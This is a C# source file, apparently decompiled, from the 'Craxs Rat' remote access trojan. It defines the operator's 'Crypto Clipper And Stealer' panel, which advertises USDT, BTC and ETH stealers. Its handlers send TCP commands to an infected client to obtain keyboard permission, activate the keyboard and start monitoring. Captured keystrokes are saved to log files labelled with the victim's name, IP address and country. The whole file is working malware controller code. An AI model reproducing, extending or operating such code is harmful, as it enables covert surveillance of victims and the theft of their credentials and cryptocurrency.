using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class KeyboardManager : Form
{
	public delegate void updatedele(object[] obj);

	public delegate void recordnames(object[] obj);

	private IContainer components;

	[CompilerGenerated]
	[AccessedThroughProperty("checkbutton")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _checkbutton;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savebutton")]
	private DrakeUIButtonIcon _savebutton;

	[CompilerGenerated]
	[AccessedThroughProperty("checkenable")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUICheckBox _checkenable;

	[AccessedThroughProperty("checkselected")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUICheckBox _checkselected;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkkeypermission")]
	private DrakeUICheckBox _checkkeypermission;

	public Client Classclient;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon checkbutton
	{
		[CompilerGenerated]
		get
		{
			return _checkbutton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _checkbutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_checkbutton = value;
			drakeUIButtonIcon = _checkbutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acttext")]
	internal virtual Label acttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("primtext")]
	internal virtual Label primtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statustext")]
	internal virtual TextBox statustext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("montext")]
	internal virtual Label montext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon savebutton
	{
		[CompilerGenerated]
		get
		{
			return _savebutton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _savebutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_savebutton = value;
			drakeUIButtonIcon = _savebutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkenable
	{
		[CompilerGenerated]
		get
		{
			return _checkenable;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checkenable_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _checkenable;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_checkenable = value;
			drakeUICheckBox = _checkenable;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox checkselected
	{
		[CompilerGenerated]
		get
		{
			return _checkselected;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checkselected_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _checkselected;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_checkselected = value;
			drakeUICheckBox = _checkselected;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox checkkeypermission
	{
		[CompilerGenerated]
		get
		{
			return _checkkeypermission;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checkkeypermission_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _checkkeypermission;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_checkkeypermission = value;
			drakeUICheckBox = _checkkeypermission;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.Panel1 = new System.Windows.Forms.Panel();
		this.checkenable = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkselected = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkkeypermission = new DrakeUI.Framework.DrakeUICheckBox();
		this.savebutton = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label5 = new System.Windows.Forms.Label();
		this.montext = new System.Windows.Forms.Label();
		this.Label4 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.acttext = new System.Windows.Forms.Label();
		this.primtext = new System.Windows.Forms.Label();
		this.checkbutton = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.statustext = new System.Windows.Forms.TextBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.Panel1.Controls.Add(this.checkenable);
		this.Panel1.Controls.Add(this.checkselected);
		this.Panel1.Controls.Add(this.checkkeypermission);
		this.Panel1.Controls.Add(this.savebutton);
		this.Panel1.Controls.Add(this.Label5);
		this.Panel1.Controls.Add(this.montext);
		this.Panel1.Controls.Add(this.Label4);
		this.Panel1.Controls.Add(this.Label3);
		this.Panel1.Controls.Add(this.acttext);
		this.Panel1.Controls.Add(this.primtext);
		this.Panel1.Controls.Add(this.checkbutton);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(315, 482);
		this.Panel1.TabIndex = 0;
		this.checkenable.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkenable.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkenable.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkenable.Location = new System.Drawing.Point(45, 381);
		this.checkenable.Name = "checkenable";
		this.checkenable.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkenable.Size = new System.Drawing.Size(60, 29);
		this.checkenable.TabIndex = 22;
		this.checkselected.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkselected.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkselected.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkselected.Location = new System.Drawing.Point(45, 288);
		this.checkselected.Name = "checkselected";
		this.checkselected.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkselected.Size = new System.Drawing.Size(60, 29);
		this.checkselected.TabIndex = 21;
		this.checkkeypermission.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkkeypermission.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkkeypermission.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkkeypermission.Location = new System.Drawing.Point(45, 186);
		this.checkkeypermission.Name = "checkkeypermission";
		this.checkkeypermission.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkkeypermission.Size = new System.Drawing.Size(60, 29);
		this.checkkeypermission.TabIndex = 20;
		this.savebutton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.savebutton.Dock = System.Windows.Forms.DockStyle.Top;
		this.savebutton.FillColor = System.Drawing.Color.Black;
		this.savebutton.Font = new System.Drawing.Font("Calibri", 12f);
		this.savebutton.ForeColor = System.Drawing.Color.SkyBlue;
		this.savebutton.Location = new System.Drawing.Point(0, 61);
		this.savebutton.Name = "savebutton";
		this.savebutton.RectColor = System.Drawing.Color.SkyBlue;
		this.savebutton.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.savebutton.Size = new System.Drawing.Size(315, 61);
		this.savebutton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.savebutton.Symbol = 61639;
		this.savebutton.TabIndex = 19;
		this.savebutton.Text = "Start Crypto Stealer";
		this.Label5.AutoSize = true;
		this.Label5.Font = new System.Drawing.Font("Calibri", 12f);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(10, 385);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(23, 25);
		this.Label5.TabIndex = 18;
		this.Label5.Text = "3";
		this.montext.AutoSize = true;
		this.montext.Font = new System.Drawing.Font("Calibri", 12f);
		this.montext.ForeColor = System.Drawing.Color.SkyBlue;
		this.montext.Location = new System.Drawing.Point(159, 385);
		this.montext.Name = "montext";
		this.montext.Size = new System.Drawing.Size(77, 25);
		this.montext.TabIndex = 17;
		this.montext.Text = "ETH Stealer";
		this.Label4.AutoSize = true;
		this.Label4.Font = new System.Drawing.Font("Calibri", 12f);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(10, 288);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(23, 25);
		this.Label4.TabIndex = 15;
		this.Label4.Text = "2";
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Calibri", 12f);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(16, 186);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(23, 25);
		this.Label3.TabIndex = 14;
		this.Label3.Text = "1";
		this.acttext.AutoSize = true;
		this.acttext.Font = new System.Drawing.Font("Calibri", 12f);
		this.acttext.ForeColor = System.Drawing.Color.SkyBlue;
		this.acttext.Location = new System.Drawing.Point(148, 288);
		this.acttext.Name = "acttext";
		this.acttext.Size = new System.Drawing.Size(101, 25);
		this.acttext.TabIndex = 13;
		this.acttext.Text = "BTC Stealer";
		this.primtext.AutoSize = true;
		this.primtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.primtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.primtext.Location = new System.Drawing.Point(111, 186);
		this.primtext.Name = "primtext";
		this.primtext.Size = new System.Drawing.Size(198, 25);
		this.primtext.TabIndex = 11;
		this.primtext.Text = "USDT Trc-20 Stealer";
		this.checkbutton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkbutton.Dock = System.Windows.Forms.DockStyle.Top;
		this.checkbutton.FillColor = System.Drawing.Color.Black;
		this.checkbutton.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkbutton.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkbutton.Location = new System.Drawing.Point(0, 0);
		this.checkbutton.Name = "checkbutton";
		this.checkbutton.RectColor = System.Drawing.Color.SkyBlue;
		this.checkbutton.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.checkbutton.Size = new System.Drawing.Size(315, 61);
		this.checkbutton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkbutton.Symbol = 61473;
		this.checkbutton.TabIndex = 0;
		this.checkbutton.Text = "Transaction Histroy";
		this.statustext.BackColor = System.Drawing.Color.Black;
		this.statustext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.statustext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.statustext.ForeColor = System.Drawing.Color.SkyBlue;
		this.statustext.Location = new System.Drawing.Point(325, 0);
		this.statustext.Multiline = true;
		this.statustext.Name = "statustext";
		this.statustext.ReadOnly = true;
		this.statustext.Size = new System.Drawing.Size(780, 482);
		this.statustext.TabIndex = 1;
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel2.Location = new System.Drawing.Point(315, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(10, 482);
		this.Panel2.TabIndex = 2;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(1105, 482);
		base.Controls.Add(this.statustext);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		this.MinimumSize = new System.Drawing.Size(1011, 490);
		base.Name = "Crypto Clipper And Stealer";
		base.ShowIcon = false;
		this.Text = "Crypto Clipper And Stealer";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				checkbutton.Text = "检查权限";
				savebutton.Text = "保存日志";
				primtext.Text = "键盘权限";
				acttext.Text = "激活键盘";
				montext.Text = "开始监控";
			}
		}
		else
		{
			checkbutton.Text = "فحص الصلاحيات";
			savebutton.Text = "حفظ السجل";
			primtext.Text = "صلاحية لوحة المفاتيح";
			acttext.Text = "تفعيل لوحة المفاتيح";
			montext.Text = "تفعيل المراقبة";
		}
	}

	public KeyboardManager()
	{
		base.FormClosing += KeyboardManager_FormClosing;
		InitializeComponent();
		CraxsStyle();
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz(object[] obj)
	{
		if (statustext.InvokeRequired)
		{
			updatedele method = CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz;
			statustext.Invoke(method, new object[1] { obj });
		}
		else
		{
			string text = Conversions.ToString(obj[0]);
			statustext.AppendText("--->" + text + "\r\n");
			statustext.SelectionStart = statustext.Text.Length;
			statustext.ScrollToCaret();
		}
	}

	public void UpdatePrims(object[] obj)
	{
		if (base.InvokeRequired)
		{
			recordnames method = UpdatePrims;
			Invoke(method, new object[1] { obj });
			return;
		}
		string[] array = (string[])obj[0];
		statustext.Text = "";
		if (Operators.CompareString(array[0], "1", TextCompare: false) == 0)
		{
			checkkeypermission.Checked = true;
			checkkeypermission.Enabled = false;
			statustext.AppendText("--->Permission Granted\r\n");
		}
		else
		{
			checkkeypermission.Checked = false;
			checkkeypermission.Enabled = true;
		}
		if (Operators.CompareString(array[1], "1", TextCompare: false) == 0)
		{
			checkselected.Checked = true;
			checkselected.Enabled = false;
			statustext.AppendText("--->Keyboard Active now\r\n");
		}
		else
		{
			checkselected.Checked = false;
			checkselected.Enabled = true;
		}
	}

	private void Checkenable_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkkeypermission.Enabled | checkselected.Enabled)
		{
			CraxsAlert.Showinformation("Please Enable 1 & 2 first");
			checkenable.Checked = false;
		}
		else if (checkenable.Checked)
		{
			if (Classclient != null)
			{
				TcpClient myClient = Classclient.myClient;
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>ENB:1" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
		}
		else if (Classclient != null)
		{
			TcpClient myClient2 = Classclient.myClient;
			string[] array2 = Classclient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				myClient2,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>ENB:2" + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects2);
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>lod" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void Checkkeypermission_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkkeypermission.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>AKP" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void Checkselected_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkselected.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>AKA" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(statustext.Text))
		{
			CraxsAlert.Showinformation("No log found to save");
			return;
		}
		try
		{
			if (!Directory.Exists(Classclient.FolderUSER + "\\KeyBoard"))
			{
				Directory.CreateDirectory(Classclient.FolderUSER + "\\KeyBoard");
			}
			string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
			if (!File.Exists(Classclient.FolderUSER + "\\KeyBoard\\" + text))
			{
				File.Create(Classclient.FolderUSER + "\\KeyBoard\\" + text).Dispose();
				File.AppendAllText(Classclient.FolderUSER + "\\KeyBoard\\" + text, "Client Name: " + Classclient.ClientName + "\r\nClient IP: " + Classclient.ClientAddressIP + "\r\nCountry: " + Classclient.Country + "\r\nDate :" + DateTime.Now.ToString() + "\r\n----------------------------------------\r\n");
			}
			File.AppendAllText(Classclient.FolderUSER + "\\KeyBoard\\" + text, text + statustext.Text + "\r\n");
			Process.Start(Classclient.FolderUSER + "\\KeyBoard");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KeyboardManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (checkenable.Checked)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>ENB:2" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}
}
